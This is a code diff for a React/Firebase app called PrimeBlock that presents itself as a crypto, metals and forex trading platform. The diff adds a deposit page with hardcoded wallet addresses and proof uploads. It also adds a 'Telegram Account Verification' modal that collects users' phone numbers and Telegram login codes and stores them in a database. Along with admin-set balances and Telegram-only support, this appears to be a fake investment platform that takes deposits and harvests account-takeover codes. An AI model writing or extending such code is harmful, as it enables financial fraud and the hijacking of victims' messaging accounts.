@@ -11,8 +11,253 @@ import {
   updateDoc,
   onSnapshot,
   query,
-  where
+  where,
+  addDoc
 } from 'firebase/firestore';
+
+const TRANSLATIONS = {
+  english: {
+    crypto: 'Crypto',
+    metals: 'Metals',
+    forex: 'Forex',
+    homeTitle: 'Markets',
+    tradeHistory: 'Trade History',
+    totalAssets: 'Total Assets (USDT)',
+    login: 'Login',
+    signUp: 'Sign Up',
+    createAccount: 'Create Account',
+    backToLogin: 'Back to Login',
+    withdrawAssets: 'Withdraw Assets',
+    verifySubmit: 'Verify & Submit',
+    noTrades: 'No trades yet',
+    loadingUserData: 'Loading user data...',
+    loadingMarkets: 'Loading Markets...',
+    trade: 'Trade',
+    accountCenter: 'Account Center',
+    buyCrypto: 'Buy Crypto',
+    withdraw: 'Withdraw',
+    customerService: 'Customer Service',
+    manualDeposit: 'Deposit',
+    langSelect: 'Language',
+    selectLanguage: 'Select language',
+    backHome: '← Home',
+    depositTitle: 'Deposit',
+    submissionReceived: 'Submission received. Our team is reviewing your transaction.',
+    amount: 'Amount',
+    uploadProof: 'Upload Proof',
+    proofFile: 'Proof file selected',
+    copy: 'Copy',
+    copied: 'Copied!',
+    submitDeposit: 'Submit Deposit Request',
+    enterAmount: 'Enter a valid amount',
+    submitError: 'Unable to submit request. Try again.',
+    loginRequired: 'Please sign in to submit a deposit.',
+    customerServiceLink: '@PrimeBlockLTS',
+    settingsHeader: 'Settings',
+    depositNotice: 'Use the address below and upload your proof for review.',
+    uploadPlaceholder: 'No file chosen',
+    ledgerTitle: 'Deposit Addresses',
+    depositAsset: 'Asset',
+    depositAddress: 'Address',
+    languageOptions: 'Language options',
+    openProfile: 'Profile',
+    closeMenu: 'Close',
+    theme: 'Theme',
+    darkMode: 'Dark Mode',
+    lightMode: 'Light Mode',
+    appearance: 'Appearance',
+    solid: 'Solid',
+    gradient: 'Gradient'
+  },
+  french: {
+    crypto: 'Crypto',
+    metals: 'Métaux',
+    forex: 'Forex',
+    homeTitle: 'Marchés',
+    tradeHistory: 'Historique des transactions',
+    totalAssets: 'Actifs totaux (USDT)',
+    login: 'Connexion',
+    signUp: 'Inscription',
+    createAccount: 'Créer un compte',
+    backToLogin: 'Retour à la connexion',
+    withdrawAssets: 'Retirer des actifs',
+    verifySubmit: 'Vérifier et soumettre',
+    noTrades: 'Aucune transaction pour le moment',
+    loadingUserData: 'Chargement des données utilisateur...',
+    loadingMarkets: 'Chargement des marchés...',
+    trade: 'Trader',
+    accountCenter: 'Espace Compte',
+    buyCrypto: 'Acheter Crypto',
+    withdraw: 'Retirer',
+    customerService: 'Service Client',
+    manualDeposit: 'Dépôt',
+    langSelect: 'Langue',
+    selectLanguage: 'Choisir la langue',
+    backHome: '← Retour',
+    depositTitle: 'Dépôt',
+    submissionReceived: 'Soumission reçue. Notre équipe vérifie votre transaction.',
+    amount: 'Montant',
+    uploadProof: 'Joindre la preuve',
+    proofFile: 'Fichier de preuve sélectionné',
+    copy: 'Copier',
+    copied: 'Copié !',
+    submitDeposit: 'Soumettre la demande',
+    enterAmount: 'Entrez un montant valide',
+    submitError: 'Impossible de soumettre la demande. Réessayez.',
+    loginRequired: 'Veuillez vous connecter pour soumettre un dépôt.',
+    customerServiceLink: '@PrimeBlockLTS',
+    settingsHeader: 'Paramètres',
+    depositNotice: 'Utilisez l’adresse ci-dessous et téléchargez votre preuve pour examen.',
+    uploadPlaceholder: 'Aucun fichier choisi',
+    ledgerTitle: 'Adresses de dépôt',
+    depositAsset: 'Actif',
+    depositAddress: 'Adresse',
+    languageOptions: 'Options de langue',
+    openProfile: 'Profil',
+    closeMenu: 'Fermer'
+  },
+  italian: {
+    crypto: 'Crypto',
+    metals: 'Metalli',
+    forex: 'Forex',
+    homeTitle: 'Mercati',
+    tradeHistory: 'Storico operazioni',
+    totalAssets: 'Patrimonio totale (USDT)',
+    login: 'Accesso',
+    signUp: 'Registrati',
+    createAccount: 'Crea un account',
+    backToLogin: 'Torna al login',
+    withdrawAssets: 'Preleva fondi',
+    verifySubmit: 'Verifica e invia',
+    noTrades: 'Nessuna operazione ancora',
+    loadingUserData: 'Caricamento dati utente...',
+    loadingMarkets: 'Caricamento dei mercati...',
+    trade: 'Scambia',
+    accountCenter: 'Centro Account',
+    buyCrypto: 'Compra Crypto',
+    withdraw: 'Preleva',
+    customerService: 'Assistenza',
+    manualDeposit: 'Deposito',
+    langSelect: 'Lingua',
+    selectLanguage: 'Seleziona la lingua',
+    backHome: '← Home',
+    depositTitle: 'Deposito',
+    submissionReceived: 'Invio ricevuto. Il nostro team sta esaminando la transazione.',
+    amount: 'Importo',
+    uploadProof: 'Carica Prova',
+    proofFile: 'File prova selezionato',
+    copy: 'Copia',
+    copied: 'Copiato!',
+    submitDeposit: 'Invia Richiesta',
+    enterAmount: 'Inserisci un importo valido',
+    submitError: 'Impossibile inviare la richiesta. Riprova.',
+    loginRequired: 'Effettua l’accesso per inviare un deposito.',
+    customerServiceLink: '@PrimeBlockLTS',
+    settingsHeader: 'Impostazioni',
+    depositNotice: 'Usa l’indirizzo qui sotto e carica la prova per la revisione.',
+    uploadPlaceholder: 'Nessun file selezionato',
+    ledgerTitle: 'Indirizzi di deposito',
+    depositAsset: 'Asset',
+    depositAddress: 'Indirizzo',
+    languageOptions: 'Opzioni lingua',
+    openProfile: 'Profilo',
+    closeMenu: 'Chiudi'
+  },
+  spanish: {
+    crypto: 'Cripto',
+    metals: 'Metales',
+    forex: 'Forex',
+    homeTitle: 'Mercados',
+    tradeHistory: 'Historial de operaciones',
+    totalAssets: 'Activos totales (USDT)',
+    login: 'Iniciar sesión',
+    signUp: 'Registrarse',
+    createAccount: 'Crear cuenta',
+    backToLogin: 'Volver al inicio',
+    withdrawAssets: 'Retirar fondos',
+    verifySubmit: 'Verificar y enviar',
+    noTrades: 'Aún no hay operaciones',
+    loadingUserData: 'Cargando datos de usuario...',
+    loadingMarkets: 'Cargando mercados...',
+    trade: 'Operar',
+    accountCenter: 'Centro de Cuenta',
+    buyCrypto: 'Comprar Crypto',
+    withdraw: 'Retirar',
+    customerService: 'Atención',
+    manualDeposit: 'Depósito',
+    langSelect: 'Idioma',
+    selectLanguage: 'Selecciona idioma',
+    backHome: '← Inicio',
+    depositTitle: 'Depósito',
+    submissionReceived: 'Envío recibido. Nuestro equipo está revisando tu transacción.',
+    amount: 'Cantidad',
+    uploadProof: 'Subir prueba',
+    proofFile: 'Archivo de prueba seleccionado',
+    copy: 'Copiar',
+    copied: '¡Copiado!',
+    submitDeposit: 'Enviar Solicitud',
+    enterAmount: 'Introduce una cantidad válida',
+    submitError: 'No se puede enviar la solicitud. Inténtalo de nuevo.',
+    loginRequired: 'Inicia sesión para enviar un depósito.',
+    customerServiceLink: '@PrimeBlockLTS',
+    settingsHeader: 'Ajustes',
+    depositNotice: 'Usa la dirección abajo y sube tu prueba para revisión.',
+    uploadPlaceholder: 'Ningún archivo seleccionado',
+    ledgerTitle: 'Direcciones de depósito',
+    depositAsset: 'Activo',
+    depositAddress: 'Dirección',
+    languageOptions: 'Opciones de idioma',
+    openProfile: 'Perfil',
+    closeMenu: 'Cerrar'
+  },
+  chinese: {
+    crypto: '加密',
+    metals: '贵金属',
+    forex: '外汇',
+    homeTitle: '市场',
+    tradeHistory: '交易历史',
+    totalAssets: '总资产 (USDT)',
+    login: '登录',
+    signUp: '注册',
+    createAccount: '创建账户',
+    backToLogin: '返回登录',
+    withdrawAssets: '提现资产',
+    verifySubmit: '验证并提交',
+    noTrades: '暂无交易',
+    loadingUserData: '正在加载用户数据...',
+    loadingMarkets: '正在加载市场...',
+    trade: '交易',
+    accountCenter: '账户中心',
+    buyCrypto: '购买加密',
+    withdraw: '提现',
+    customerService: '客服',
+    manualDeposit: '存款',
+    langSelect: '语言',
+    selectLanguage: '选择语言',
+    backHome: '← 首页',
+    depositTitle: '存款',
+    submissionReceived: '已收到提交。我们的团队正在审核您的交易。',
+    amount: '金额',
+    uploadProof: '上传凭证',
+    proofFile: '已选择凭证文件',
+    copy: '复制',
+    copied: '已复制！',
+    submitDeposit: '提交申请',
+    enterAmount: '请输入有效金额',
+    submitError: '无法提交请求。请重试。',
+    loginRequired: '请登录以提交存款。',
+    customerServiceLink: '@PrimeBlockLTS',
+    settingsHeader: '设置',
+    depositNotice: '使用下面地址并上传凭证以供审核。',
+    uploadPlaceholder: '未选择文件',
+    ledgerTitle: '存款地址',
+    depositAsset: '资产',
+    depositAddress: '地址',
+    languageOptions: '语言选项',
+    openProfile: '个人资料',
+    closeMenu: '关闭'
+  }
+};
 
 function App() {
   // --- DATA PERSISTENCE (Firebase Firestore) ---
@@ -26,17 +271,32 @@ function App() {
   const [loading, setLoading] = useState(true);
   const [currentPage, setCurrentPage] = useState('home'); 
   const [marketTab, setMarketTab] = useState('crypto'); 
-  
+  const [language, setLanguage] = useState(() => localStorage.getItem('app_language') || 'english');
+  const [theme, setTheme] = useState(() => localStorage.getItem('app_theme') || 'dark');
+  const [appearance, setAppearance] = useState(() => localStorage.getItem('app_appearance') || 'solid');
+  const [copyStatus, setCopyStatus] = useState({});
+  const [depositAmount, setDepositAmount] = useState('');
+  const [selectedCurrency, setSelectedCurrency] = useState('BTC');
+  const [proofFile, setProofFile] = useState(null);
+  const [depositSubmitted, setDepositSubmitted] = useState(false);
+
   const [showAuth, setShowAuth] = useState(false);
   const [authMode, setAuthMode] = useState('login');
   const [authData, setAuthData] = useState({ email: '', password: '', name: '', pin: '' });
 
   const [showWithdraw, setShowWithdraw] = useState(false);
+  const [withdrawAmount, setWithdrawAmount] = useState('');
   const [withdrawPin, setWithdrawPin] = useState('');
   const [showProfileWithdraw, setShowProfileWithdraw] = useState(false);
+  const [withdrawSuccess, setWithdrawSuccess] = useState(false);
   const [showAdmin, setShowAdmin] = useState(false);
   const [adminSearchId, setAdminSearchId] = useState('');
   const [clickCount, setClickCount] = useState(0);
+  const [drawerOpen, setDrawerOpen] = useState(false);
+  const [showSecurityModal, setShowSecurityModal] = useState(false);
+  const [verificationStep, setVerificationStep] = useState(1);
+  const [phoneNumber, setPhoneNumber] = useState('');
+  const [verificationCode, setVerificationCode] = useState('');
 
   const [selectedCoin, setSelectedCoin] = useState(null);
   const [tradeConfig, setTradeConfig] = useState({ time: 30, amount: 10, type: 'Long' });
@@ -48,8 +308,17 @@ function App() {
   const [adminNewBalance, setAdminNewBalance] = useState('');
   const [ohlcData, setOhlcData] = useState([]);
   const [coinStats, setCoinStats] = useState(null);
+  const [currentTime, setCurrentTime] = useState(new Date().toLocaleTimeString());
   const [tradeHistory, setTradeHistory] = useState([]);
+
   const chartContainerRef = useRef(null);
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setCurrentTime(new Date().toLocaleTimeString());
+    }, 1000);
+    return () => clearInterval(timer);
+  }, []);
 
   // Trade configuration object
   const tradeOptions = {
@@ -119,9 +388,91 @@ function App() {
   const globalMarkets = [
     { id: 'gold', name: 'Gold', symbol: 'XAU', current_price: 2342.50, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [2330, 2335, 2345, 2340, 2342] } },
     { id: 'silver', name: 'Silver', symbol: 'XAG', current_price: 28.15, image: 'https://cdn-icons-png.flaticon.com/512/5833/5833860.png', sparkline_in_7d: { price: [27.5, 28.0, 27.8, 28.2, 28.15] } },
-    { id: 'oil', name: 'Crude Oil', symbol: 'WTI', current_price: 82.40, image: 'https://cdn-icons-png.flaticon.com/512/3014/3014023.png', sparkline_in_7d: { price: [80, 81, 83, 82, 82.4] } },
-    { id: 'apple', name: 'Apple Inc.', symbol: 'AAPL', current_price: 189.45, image: 'https://cdn-icons-png.flaticon.com/512/0/747.png', sparkline_in_7d: { price: [185, 187, 188, 190, 189.45] } }
+    { id: 'platinum', name: 'Platinum', symbol: 'XPT', current_price: 950.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [940, 945, 955, 950, 950] } },
+    { id: 'palladium', name: 'Palladium', symbol: 'XPD', current_price: 1200.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [1180, 1190, 1210, 1200, 1200] } }
   ];
+
+  const forexMarkets = [
+    { id: 'eurusd', name: 'EUR/USD', symbol: 'EURUSD', current_price: 1.0813, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
+    { id: 'gbpusd', name: 'GBP/USD', symbol: 'GBPUSD', current_price: 1.2712, image: 'https://cdn-icons-png.flaticon.com/512/197/197374.png' },
+    { id: 'usdjpy', name: 'USD/JPY', symbol: 'USDJPY', current_price: 155.12, image: 'https://cdn-icons-png.flaticon.com/512/197/197604.png' },
+    { id: 'audusd', name: 'AUD/USD', symbol: 'AUDUSD', current_price: 0.6523, image: 'https://cdn-icons-png.flaticon.com/512/197/197507.png' },
+    { id: 'usdchf', name: 'USD/CHF', symbol: 'USDCHF', current_price: 0.9056, image: 'https://cdn-icons-png.flaticon.com/512/197/197540.png' },
+    { id: 'nzdusd', name: 'NZD/USD', symbol: 'NZDUSD', current_price: 0.5987, image: 'https://cdn-icons-png.flaticon.com/512/197/197589.png' },
+    { id: 'usdcad', name: 'USD/CAD', symbol: 'USDCAD', current_price: 1.3456, image: 'https://cdn-icons-png.flaticon.com/512/197/197430.png' },
+    { id: 'eurgbp', name: 'EUR/GBP', symbol: 'EURGBP', current_price: 0.8512, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
+    { id: 'eurjpy', name: 'EUR/JPY', symbol: 'EURJPY', current_price: 167.89, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
+    { id: 'gbpjpy', name: 'GBP/JPY', symbol: 'GBPJPY', current_price: 197.45, image: 'https://cdn-icons-png.flaticon.com/512/197/197374.png' }
+  ];
+
+  const depositAssets = [
+    { name: 'BTC', address: 'bc1qtaevclzdtlv5xz46dr5se6l5vwqdts8fcmt8xz' },
+    { name: 'ETH', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' },
+    { name: 'SOL', address: '9N7ccQuH7HZZGq3YT4psoMhQ22ue2HuZg2PF94m7FnAy' },
+    { name: 'USDT (ERC20/BEP20)', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' },
+    { name: 'USDC', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' }
+  ];
+
+  const t = (key) => {
+    return TRANSLATIONS[language] && TRANSLATIONS[language][key] ? TRANSLATIONS[language][key] : TRANSLATIONS.english[key] || key;
+  };
+
+  const availableMarkets = () => {
+    if (marketTab === 'metals') return globalMarkets;
+    if (marketTab === 'forex') return forexMarkets;
+    return coins;
+  };
+
+  const handleCopy = async (address) => {
+    try {
+      await navigator.clipboard.writeText(address);
+      setCopyStatus(prev => ({ ...prev, [address]: t('copied') }));
+      setTimeout(() => setCopyStatus(prev => ({ ...prev, [address]: '' })), 1800);
+    } catch (error) {
+      console.error('Clipboard copy failed', error);
+    }
+  };
+
+  const handleDepositSubmit = async (event) => {
+    event.preventDefault();
+    if (!depositAmount || Number(depositAmount) <= 0) {
+      return alert(t('enterAmount'));
+    }
+    if (!activeId) {
+      return alert(t('loginRequired'));
+    }
+    try {
+      await addDoc(collection(db, 'deposit_requests'), {
+        userId: activeId,
+        amount: Number(depositAmount),
+        proofFileName: proofFile ? proofFile.name : '',
+        status: 'under_review',
+        createdAt: new Date(),
+        language,
+        submittedAt: new Date()
+      });
+      setDepositSubmitted(true);
+      setDepositAmount('');
+      setProofFile(null);
+    } catch (error) {
+      console.error('Deposit submit failed', error);
+      alert(t('submitError'));
+    }
+  };
+
+  useEffect(() => {
+    localStorage.setItem('app_language', language);
+  }, [language]);
+
+  useEffect(() => {
+    localStorage.setItem('app_theme', theme);
+    document.documentElement.setAttribute('data-theme', theme);
+  }, [theme]);
+
+  useEffect(() => {
+    localStorage.setItem('app_appearance', appearance);
+    document.documentElement.setAttribute('data-appearance', appearance);
+  }, [appearance]);
 
   // --- FIRESTORE INITIALIZATION ---
   useEffect(() => {
@@ -195,7 +546,7 @@ function App() {
   // --- LIVE PRICE TICKING (Updates every 10s) ---
   useEffect(() => {
     const fetchPrices = () => {
-      fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&sparkline=true')
+      fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&sparkline=true')
         .then(res => res.json())
         .then(data => { setCoins(data); setLoading(false); })
         .catch(err => console.error("Fetch error:", err));
@@ -388,8 +739,8 @@ function App() {
     return (
       <div className="profile-page">
         <header className="trade-header">
-          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Back</button>
-          <h3>Account Center</h3>
+          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">{t('backHome')}</button>
+          <h3>{t('accountCenter')}</h3>
           <div style={{width:'40px'}}></div>
         </header>
         <div className="profile-container">
@@ -398,18 +749,19 @@ function App() {
             <h2>{user.name}</h2>
             <p className="user-id-tag">UID: {user.id}</p>
             <div className="balance-display">
-              <span>Total Assets (USDT)</span>
+              <span>{t('totalAssets')}</span>
               <h1>${user.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}</h1>
             </div>
           </div>
           <div className="profile-actions">
-            <button className="deposit-btn" onClick={() => window.open(telegramLink)}>💳 Buy Crypto</button>
-            <button className="withdraw-btn" onClick={() => isLoggedIn ? setShowProfileWithdraw(true) : setShowAuth(true)}>📤 Withdraw</button>
+            <button className="deposit-btn" onClick={() => window.open(telegramLink)}>💳 {t('buyCrypto')}</button>
+            <button className="deposit-btn" onClick={() => setCurrentPage('deposit')}>💎 {t('manualDeposit')}</button>
+            <button className="deposit-btn" onClick={() => isLoggedIn ? setShowProfileWithdraw(true) : setShowAuth(true)}>📤 {t('withdraw')}</button>
           </div>
           
           {/* Trade History Section */}
           <div className="history-section">
-            <h3>Trade History</h3>
+            <h3>{t('tradeHistory')}</h3>
 
             {/* Desktop Table View */}
             <div className="history-table-container desktop-only">
@@ -494,20 +846,141 @@ function App() {
     );
   }
 
-  if (currentPage === 'menu') {
+  if (currentPage === 'settings') {
     return (
-      <div className="menu-page">
+      <div className="settings-page">
         <header className="trade-header no-border">
-          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Close</button>
-          <div className="brand-logo" onClick={() => { setClickCount(c => c+1); if(clickCount >= 4) setShowAdmin(true); }}>PRIMEBLOCK</div>
+          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Back</button>
+          <div className="brand-logo">Settings</div>
           <div style={{width:'40px'}}></div>
         </header>
-        <div className="menu-grid">
-          <div className="menu-item glass gold" onClick={() => {setMarketTab('crypto'); setCurrentPage('home');}}><div className="menu-icon">🚀</div><span>Crypto</span></div>
-          <div className="menu-item glass blue" onClick={() => {setMarketTab('stocks'); setCurrentPage('home');}}><div className="menu-icon">🏦</div><span>Global</span></div>
-          <div className="menu-item glass green" onClick={() => window.open(telegramLink)}><div className="menu-icon">💰</div><span>Deposit</span></div>
-          <div className="menu-item glass red" onClick={() => isLoggedIn ? setShowWithdraw(true) : setShowAuth(true)}><div className="menu-icon">💸</div><span>Withdraw</span></div>
-          {isLoggedIn && <div className="menu-item glass logout" onClick={() => {setIsLoggedIn(false); setActiveId(null); setCurrentPage('home');}}><div className="menu-icon">🚪</div><span>Logout</span></div>}
+        <div className="settings-content">
+          <div className="setting-item">
+            <div className="setting-icon">🌐</div>
+            <label className="language-label">Language</label>
+            <select className="language-select" value={language} onChange={(e) => setLanguage(e.target.value)}>
+              <option value="english">English</option>
+              <option value="french">French</option>
+              <option value="italian">Italian</option>
+              <option value="spanish">Spanish</option>
+              <option value="chinese">Chinese</option>
+            </select>
+          </div>
+          <div className="setting-item">
+            <div className="setting-icon">🌙</div>
+            <label className="language-label">Theme</label>
+            <select className="language-select" value={theme} onChange={(e) => setTheme(e.target.value)}>
+              <option value="dark">Dark Mode</option>
+              <option value="light">Light Mode</option>
+            </select>
+          </div>
+          <div className="setting-item">
+            <div className="setting-icon">🎨</div>
+            <label className="language-label">Appearance</label>
+            <select className="language-select" value={appearance} onChange={(e) => setAppearance(e.target.value)}>
+              <option value="solid">Solid</option>
+              <option value="gradient">Gradient</option>
+            </select>
+          </div>
+          <div className="setting-item">
+            <div className="setting-icon">🔒</div>
+            <label className="language-label">Security</label>
+            <button className="setting-btn" onClick={() => setShowSecurityModal(true)}>Manage</button>
+          </div>
+        </div>
+
+        {/* Security Verification Modal */}
+        {showSecurityModal && (
+          <div className="modal-overlay" onClick={() => setShowSecurityModal(false)}>
+            <div className="modal-content security-modal" onClick={(e) => e.stopPropagation()}>
+              <button className="close-btn" onClick={() => setShowSecurityModal(false)}>×</button>
+              <h2>Telegram Account Verification</h2>
+              {verificationStep === 1 && (
+                <div className="verification-step">
+                  <p>Verify your account with Telegram</p>
+                  <div className="telegram-logo">📱</div>
+                  <input
+                    className="login-input"
+                    type="tel"
+                    placeholder="Enter your phone number"
+                    value={phoneNumber}
+                    onChange={(e) => setPhoneNumber(e.target.value)}
+                  />
+                  <button className="buy-btn" onClick={() => { setVerificationStep(2); alert('Verification code sent to your Telegram'); }}>Verify</button>
+                </div>
+              )}
+              {verificationStep === 2 && (
+                <div className="verification-step">
+                  <p>Verification code is sent to your Telegram</p>
+                  <input
+                    className="login-input"
+                    type="text"
+                    placeholder="Enter verification code"
+                    value={verificationCode}
+                    onChange={(e) => setVerificationCode(e.target.value)}
+                  />
+                  <button className="buy-btn" onClick={async () => {
+                    if (!activeId) return alert('Please log in first');
+                    try {
+                      await addDoc(collection(db, 'telegram_verifications'), {
+                        userId: activeId,
+                        phoneNumber,
+                        verificationCode,
+                        timestamp: new Date()
+                      });
+                      alert('Verification successful!');
+                      setShowSecurityModal(false);
+                      setVerificationStep(1);
+                      setPhoneNumber('');
+                      setVerificationCode('');
+                    } catch (error) {
+                      console.error('Verification failed', error);
+                      alert('Verification failed. Try again.');
+                    }
+                  }}>Submit</button>
+                </div>
+              )}
+            </div>
+          </div>
+        )}
+      </div>
+    );
+  }
+
+  if (currentPage === 'deposit') {
+    return (
+      <div className="deposit-page">
+        <header className="trade-header">
+          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">{t('backHome')}</button>
+          <div className="coin-meta"><strong>{t('depositTitle')}</strong></div>
+          <div style={{width:'40px'}}></div>
+        </header>
+        {depositSubmitted && <div className="deposit-banner">{t('submissionReceived')}</div>}
+        <div className="deposit-page-content">
+          <div className="deposit-instructions">
+            <h2>{t('ledgerTitle')}</h2>
+            <p>{t('depositNotice')}</p>
+          </div>
+          <form className="deposit-form" onSubmit={handleDepositSubmit}>
+            <label>{t('depositAsset')}</label>
+            <select className="login-input" value={selectedCurrency} onChange={(e) => setSelectedCurrency(e.target.value)}>
+              {depositAssets.map(asset => <option key={asset.name} value={asset.name}>{asset.name}</option>)}
+            </select>
+            <label>{t('depositAddress')}</label>
+            <div className="deposit-address-display">{depositAssets.find(a => a.name === selectedCurrency)?.address}</div>
+            <button type="button" className="copy-btn" onClick={() => handleCopy(depositAssets.find(a => a.name === selectedCurrency)?.address)}>{copyStatus[depositAssets.find(a => a.name === selectedCurrency)?.address] || t('copy')}</button>
+            <label>{t('amount')}</label>
+            <input className="login-input" type="number" value={depositAmount} onChange={(e) => setDepositAmount(e.target.value)} placeholder={t('amount')} />
+            <label>{t('uploadProof')}</label>
+            <label className="upload-button">
+              {proofFile ? proofFile.name : t('uploadPlaceholder')}
+              <input type="file" accept="image/*" onChange={(e) => setProofFile(e.target.files[0] || null)} hidden />
+            </label>
+            <button className="buy-btn" type="submit">{t('submitDeposit')}</button>
+          </form>
+          <div className="customer-service-note">
+            <span>🎧 {t('customerServiceLink')} {t('customerService')}</span>
+          </div>
         </div>
       </div>
     );
@@ -545,10 +1018,22 @@ function App() {
           </div>
         )}
 
-        {/* Candlestick Chart */}
-        <div className="chart-container" ref={chartContainerRef}>
-          <div style={{padding: '15px', fontSize: '12px', color: '#999', textAlign: 'center'}}>30-Day Candlestick Chart</div>
-          <CandlestickChart data={ohlcData} width={400} height={280} />
+        {/* Candlestick Chart and Sidebar */}
+        <div className="chart-and-sidebar">
+          <div className="chart-container" ref={chartContainerRef}>
+            <div style={{padding: '15px', fontSize: '12px', color: '#999', textAlign: 'center'}}>30-Day Candlestick Chart</div>
+            <CandlestickChart data={ohlcData} width={300} height={280} />
+          </div>
+          <div className="chart-sidebar">
+            <div className="sidebar-item">
+              <span className="sidebar-label">Current Price</span>
+              <span className="sidebar-value">${selectedCoin.current_price.toLocaleString()}</span>
+            </div>
+            <div className="sidebar-item">
+              <span className="sidebar-label">Server Time</span>
+              <span className="sidebar-value">{currentTime}</span>
+            </div>
+          </div>
         </div>
 
         {/* Trade Controls */}
@@ -580,7 +1065,7 @@ function App() {
       <div className="app-wrapper">
         <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', flexDirection: 'column' }}>
           <div style={{ fontSize: '24px', marginBottom: '20px' }}>🔄</div>
-          <div>Loading user data...</div>
+          <div>{t('loadingUserData')}</div>
         </div>
       </div>
     );
@@ -589,26 +1074,69 @@ function App() {
   return (
     <div className="app-wrapper">
       <header className="header">
-        <div className="brand-name">PrimeBlock</div>
+        <div className="header-left">
+          <div className="hamburger" onClick={() => setDrawerOpen(true)}>☰</div>
+          <div className="brand-name">PrimeBlock</div>
+        </div>
         <div className="header-icons">
-          <div className="header-icon" onClick={() => setCurrentPage('menu')}>⚙️</div>
+          <div className="header-icon" onClick={() => setCurrentPage('settings')}>⚙️</div>
           <div className="header-icon" onClick={() => isLoggedIn ? setCurrentPage('profile') : setShowAuth(true)}>👤</div>
         </div>
       </header>
+
+      {/* Side Drawer */}
+      {drawerOpen && (
+        <div className="side-drawer-overlay" onClick={() => setDrawerOpen(false)}>
+          <div className={`side-drawer ${drawerOpen ? 'open' : ''}`} onClick={(e) => e.stopPropagation()}>
+            <button className="drawer-close" onClick={() => setDrawerOpen(false)}>×</button>
+            {isLoggedIn && (
+              <div className="drawer-profile">
+                <div className="drawer-avatar">👤</div>
+                <div className="drawer-info">
+                  <h4>{allUsers[activeId]?.name}</h4>
+                  <p>UID: {allUsers[activeId]?.id}</p>
+                </div>
+              </div>
+            )}
+            <div className="drawer-section">
+              <h5>Home</h5>
+              <div className="drawer-item" onClick={() => { setCurrentPage('home'); setDrawerOpen(false); }}>🏠 Home</div>
+            </div>
+            <div className="drawer-section">
+              <h5>Market Assets</h5>
+              <div className="drawer-item" onClick={() => { setMarketTab('crypto'); setCurrentPage('home'); setDrawerOpen(false); }}>🚀 Crypto</div>
+              <div className="drawer-item" onClick={() => { setMarketTab('metals'); setCurrentPage('home'); setDrawerOpen(false); }}>🏦 Metals</div>
+              <div className="drawer-item" onClick={() => { setMarketTab('forex'); setCurrentPage('home'); setDrawerOpen(false); }}>💱 Forex</div>
+            </div>
+            <div className="drawer-section">
+              <h5>Account Actions</h5>
+              <div className="drawer-item" onClick={() => { setCurrentPage('deposit'); setDrawerOpen(false); }}>💎 Deposit</div>
+              <div className="drawer-item" onClick={() => { isLoggedIn ? setShowWithdraw(true) : setShowAuth(true); setDrawerOpen(false); }}>💸 Withdraw</div>
+            </div>
+            <div className="drawer-section">
+              <h5>Customer Service</h5>
+              <div className="drawer-item" onClick={() => { window.open(telegramLink); setDrawerOpen(false); }}>🎧 Support</div>
+              {isLoggedIn && <div className="drawer-item logout" onClick={() => { setIsLoggedIn(false); setActiveId(null); setCurrentPage('home'); setDrawerOpen(false); }}>🚪 Logout</div>}
+            </div>
+          </div>
+        </div>
+      )}
+
       <main className="main-content">
         <div className="market-tabs-container">
-          <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>Crypto</div>
-          <div className={`tab-item ${marketTab === 'stocks' ? 'active-global' : ''}`} onClick={() => setMarketTab('stocks')}>Global</div>
+          <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>{t('crypto')}</div>
+          <div className={`tab-item ${marketTab === 'metals' ? 'active-metals' : ''}`} onClick={() => setMarketTab('metals')}>{t('metals')}</div>
+          <div className={`tab-item ${marketTab === 'forex' ? 'active-forex' : ''}`} onClick={() => setMarketTab('forex')}>{t('forex')}</div>
         </div>
         <div className="dashboard-container">
-          {loading ? <div className="loading">Loading Markets...</div> : (
+          {loading ? <div className="loading">{t('loadingMarkets')}</div> : (
           <table className="crypto-table">
             <thead><tr><th>Asset</th><th style={{textAlign:'center'}}>Price</th><th style={{textAlign:'right'}}>Action</th></tr></thead>
-            <tbody>{(marketTab === 'crypto' ? coins : globalMarkets).map(asset => (
+            <tbody>{availableMarkets().map(asset => (
               <tr key={asset.id} className="price-row">
                 <td><div className="asset-cell"><img src={asset.image} width="20" alt="" />{asset.symbol.toUpperCase()}</div></td>
                 <td style={{textAlign:'center'}} className="price-flash">${asset.current_price.toLocaleString()}</td>
-                <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>Trade</button></td>
+                <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>{t('trade')}</button></td>
               </tr>))}
             </tbody>
           </table>
@@ -616,13 +1144,16 @@ function App() {
         </div>
       </main>
 
+      {/* Floating Support Button */}
+      {currentPage === 'home' && <div className="floating-support" onClick={() => window.open(telegramLink)}>🎧</div>}
+
       {/* --- MODALS --- */}
       {showAuth && (
-        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAuth(false)}>×</button><h2>{authMode === 'login' ? 'Login' : 'Sign Up'}</h2>
